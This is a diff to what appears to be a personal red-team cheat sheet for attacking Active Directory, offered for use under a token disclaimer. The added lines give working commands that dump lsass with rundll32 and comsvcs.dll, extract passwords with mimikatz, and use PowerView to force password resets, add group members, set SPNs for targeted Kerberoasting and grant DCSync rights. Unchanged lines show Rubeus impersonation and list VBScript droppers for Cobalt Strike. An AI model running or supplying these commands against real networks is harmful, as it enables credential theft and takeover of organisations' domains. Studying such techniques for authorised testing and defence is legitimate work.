@@ -4,6 +4,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
+* **[ACLs/ACEs permissions](#acls-possible-abuse)**
+* **[Constrained Language Mode](#constrained-language-mode)**
+	* [CLM Enumeration](#clm-enumeration)
+	* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
 * **Delegation**
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
@@ -11,10 +15,38 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Constrained Delegation](#constrained-delegation)
 		* [s4u Delegation](#s4u-delegation)
 	* [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+* **[ACLs/ACEs Abuse](#acls/aces-abuse)**
+	* [ForceChangeUserPassword](#force-change-user-password)
+	* [Targeted Kerberoast](#targeted-kerberoast)
+	* [Add DCsync privilege to object](#add-dcsync-to-object)
+	* [Add Users to Group](#add-users-to-group)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
 * **[File Transfer](#file-transfer)**
+
+## ACLs possible abuse
+ACL/ACE | Permission | Abuse
+--- | --- | ---
+**GenericAll** | full rights to user/computer object | [Force change user's password](#force-change-user-password)
+**GenericWrite** | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation), [Targeted Kerberoast](#targeted-kerberoast), [Force change user's password](#force-change-user-password)
+**WriteDACL** | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
+**Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)
+
+## Constrained Language Mode (CLM)
+### CLM Enumeration
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+### Dump lsass process with signed binary
+```
+# Run this in victim/remote computer
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full
+
+# Use mimikatz's minidump 
+mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
+mimikatz# sekurlsa::logonpasswords
+```
 
 ## Unconstrained Delegation
 ### Printer Bug
@@ -65,6 +97,28 @@ mimikatz# sekurlsa::logonpasswords
 4. Apply s4u delegation (TGT+TGS)
 ```
 Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
+```
+
+## ACLs/ACEs Abuse
+### Force Change User Password
+```
+Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
+```
+### Add Users to Group
+```
+Add-DomainGroupMember -Identity studentadmins -Members studentuser
+```
+### Targeted Kerberoast
+```
+# Set SPN
+Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my\sqlspn'}
+
+# Clear SPN (OPSEC)
+Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
+```
+### Add DCSync Privilege to object
+```
+Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
 ```
 
 ## Generate VBScript dropper (APC process injection)
